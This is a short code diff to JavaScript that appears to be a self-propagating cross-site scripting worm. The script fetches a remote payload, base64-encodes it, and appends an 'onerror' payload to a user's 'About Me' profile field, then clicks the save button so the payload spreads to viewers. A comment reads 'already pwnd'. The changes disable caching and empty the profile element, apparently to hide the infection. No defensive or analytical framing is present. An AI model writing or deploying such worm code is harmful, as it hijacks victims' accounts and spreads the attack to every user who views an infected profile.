@@ -15,6 +15,7 @@ $.ajax({
 $.ajax({
     type: "GET",
     async: false,
+    cache: false,
     url: payloadURL,
     success: function (data) {
         payload = btoa(data);
@@ -30,9 +31,9 @@ setTimeout(function () {
 
     if ($('#txtAboutMe').val().indexOf("onerror") == -1) {
         $('#txtAboutMe').val($('#txtAboutMe').val() + profile_payload);
-        $(".Profile_Edit_EditProfile_Buttons  .Profile_Edit_LabelClass_Button_Save")[0].click();
-        return false;
+        $(".Profile_Edit_EditProfile_Buttons  .Profile_Edit_LabelClass_Button_Save")[0].click();       
     } else {
         //alert("already pwnd");
     }
+    $(userProfile).empty();
 }, 1000);
